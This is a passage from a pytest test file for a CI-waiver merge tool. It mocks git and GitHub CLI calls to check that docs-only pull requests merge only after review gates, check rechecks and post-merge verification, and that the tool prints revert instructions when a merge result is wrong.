        history.commit({"docs/handoffs/notes.md": "unreviewed\n"})
        tree = history.git("rev-parse", "HEAD^{tree}")
    squash = history.git("commit-tree", tree, "-p", master, "-m", "squash")
    original_classify, original_run = mod["classify"], subprocess.run
    calls = []
    doc = {"base": {"ref": "master", "sha": master}, "head": {"sha": head},
           "merged": case != "unknown", "merge_commit_sha": squash}
    def api(endpoint):
        if "/branches/master" in endpoint:
            return [{"commit": {"sha": master}}]
        if "/timeline" in endpoint:
            return [[]]
        if calls and calls[-1][1:3] == ["pr", "merge"]:
            if case == "post-head":
                return [{**doc, "head": {"sha": "e" * 40}}]
            if case == "post-base":
                return [{**doc, "base": {"ref": "topic", "sha": master}}]
        return [doc]
    def classify(*args):
        got = original_classify(*args)
        if case == "denied":
            got["class"] = "none"
        if case == "head":
            got["head"] = "f" * 40
        if case == "no-master":
            got.pop("master")
        if case == "no-tree":
            got.pop("merge_tree")
        return got
    def run(args, **kwargs):
        if args[0] != "gh":
            return original_run(args, **kwargs)
        calls.append(args)
        if args[1:3] == ["pr", "checks"]:
            return subprocess.CompletedProcess(args, 0, json.dumps([{"bucket": "fail"}] if case == "checks-failed" else []), "")
        assert args[1:3] == ["pr", "merge"]
        return subprocess.CompletedProcess(args, 1 if case == "merge-error" else 0, "", "")
    gates = []
    monkeypatch.setitem(mod, "GitHubRepository", lambda directory, repo: mod["Repository"](history.repo))
    monkeypatch.setitem(mod, "gh", api)
    monkeypatch.setitem(mod, "classify", classify)
    monkeypatch.setitem(mod, "review_gate", lambda *args: gates.append(args))
    monkeypatch.setattr(mod["subprocess"], "run", run)
    rc = mod["merge_pr"]("r/p", 1, head)
    out = capsys.readouterr()
    assert gates
    merges = [c for c in calls if c[1:3] == ["pr", "merge"]]
    if case in ("denied", "head", "checks-failed", "no-master", "no-tree"):
        assert rc == 1 and not merges
        assert "REVERT:" not in out.err
        if case != "checks-failed":
            assert "merge-precheck-refused:" in out.err
    else:
        assert len(merges) == 1
        assert merges[0][merges[0].index("--match-head-commit") + 1] == head
        if case == "clean":
            assert rc == 0 and json.loads(out.out)["verified"] is True
            assert json.loads(out.out)["master"] == master
        elif case == "unknown":
            assert rc == 1 and "VERIFY FAILED:" in out.err and "do not retry" in out.err
        else:
            assert rc == 1 and "REVERT: " + squash in out.err
            assert "git revert --no-edit --mainline 1 " + squash in out.err and "gh pr create" in out.err
    assert not any(c[:2] == ["git", "push"] for c in calls)


@pytest.mark.parametrize("case", ["clean", "blocked", "wrong-head", "wrong-marker", "no-marker", "malformed", "no-waiver", "exit", "tool-mismatch"])
def test_ci_waiver_r7_review_gate(history, monkeypatch, tmp_path, case):
    mod = waiver_module()
    master = history.commit({"bin/ci-waiver": SCRIPT.read_text(), "bin/pr-wait": "# trusted waiter\n"})
    report = {"head": master, "merge_ready": True, "ci_waiver": {
        "markers": [{"head": master, "class": "docs-only"}], "classification": {"class": "docs-only"}}}
    if case == "blocked":
        report["merge_ready"] = False
    if case == "wrong-head":
        report["head"] = "a" * 40
    if case == "wrong-marker":
        report["ci_waiver"]["markers"][0]["head"] = "a" * 40
    if case == "no-marker":
        report["ci_waiver"]["markers"] = []
    if case == "malformed":
        report["ci_waiver"]["malformed"] = True
    if case == "no-waiver":
        report["ci_waiver"]["classification"]["class"] = "none"
    if case == "tool-mismatch":
        master = history.commit({"bin/ci-waiver": "# wrong version\n"})
        report["head"] = master
        report["ci_waiver"]["markers"][0]["head"] = master
    original_run = subprocess.run
    def run(args, **kwargs):
        if "-I" not in args:
            return original_run(args, **kwargs)
        assert "--no-request" in args and "--head" in args and "--json" in args
        return subprocess.CompletedProcess(args, 1 if case == "exit" else 0, json.dumps(report), "")
    monkeypatch.setattr(mod["subprocess"], "run", run)
    r = mod["Repository"](history.repo)
    if case == "clean":
        mod["review_gate"](r, master, "r/p", 1, master, str(tmp_path))
    else:
        with pytest.raises(ValueError, match="merge-"):
            mod["review_gate"](r, master, "r/p", 1, master, str(tmp_path))


@pytest.mark.parametrize("case", ["pass", "pending", "absent", "fail", "cancel", "unknown", "bad-json", "error", "hidden-runs", "hidden-statuses"])
def test_ci_waiver_r7_recheck_checks(history, monkeypatch, case):
    mod = waiver_module()
    original_run = subprocess.run
    def run(args, **kwargs):
        if args[0] != "gh":
            return original_run(args, **kwargs)
        assert args[1:3] == ["pr", "checks"]
        rc = 1 if case in ("absent", "hidden-runs", "hidden-statuses") else 2 if case == "error" else 8 if case == "pending" else 0
        out = "not json" if case == "bad-json" else json.dumps([{"bucket": case}])
        return subprocess.CompletedProcess(args, rc, out, "")
    def api(endpoint):
        if "check-runs" in endpoint:
            return [{"check_runs": [{"status": "completed"}] if case == "hidden-runs" else []}]
        return [[{"state": "failure"}] if case == "hidden-statuses" else []]
    monkeypatch.setattr(mod["subprocess"], "run", run)
    monkeypatch.setitem(mod, "gh", api)
    if case in ("pass", "pending", "absent"):
        mod["recheck_checks"]("r/p", 1, history.base)
    else:
        with pytest.raises(ValueError):
            mod["recheck_checks"]("r/p", 1, history.base)


def test_ci_waiver_r7_merge_cli_invalid_head(history):
    # CLI dispatch must reach the merge precheck, never classify or mutate.
    result = subprocess.run([sys.executable, str(SCRIPT), "merge", "1", "--head", "bad", "--repo", "r/p"],
                            env=history.env, capture_output=True, text=True, timeout=20)
    assert result.returncode == 1 and "merge-head-must-be-full-sha" in result.stderr


@pytest.mark.parametrize("event", ["base_ref_changed", "base_ref_deleted", "automatic_base_change_succeeded"])
def test_ci_waiver_r7_retarget_pure_docs(history, event):
    history.commit({"CHANGELOG.md": "docs only\n"})
    history.routes.write_text(json.dumps({"repos/r/p/issues/1/timeline": [{"event": event}]}))
    got = history.classify(pr=True)
    assert got["class"] == "none" and got["reasons"] == ["pr-base-retargeted"]


@pytest.mark.parametrize("merge_commit", [False, True])
def test_ci_waiver_r7_revert_command(history, merge_commit):
    import shlex
    mod = waiver_module()
    head = history.commit({"docs/handoffs/note.md": "new docs\n"})
    parents = ["-p", history.base] + (["-p", head] if merge_commit else [])
    squash = history.git("commit-tree", "HEAD^{tree}", *parents, "-m", "actual result")
    history.git("checkout", "-b", "merged-result", squash)
    command = shlex.split(mod["revert_instructions"]("r/p", 1, squash).splitlines()[2])
    assert command[:2] == ["git", "revert"]
    history.git(*command[1:])
    assert history.git("rev-parse", "HEAD^{tree}") == history.git("rev-parse", history.base + "^{tree}")
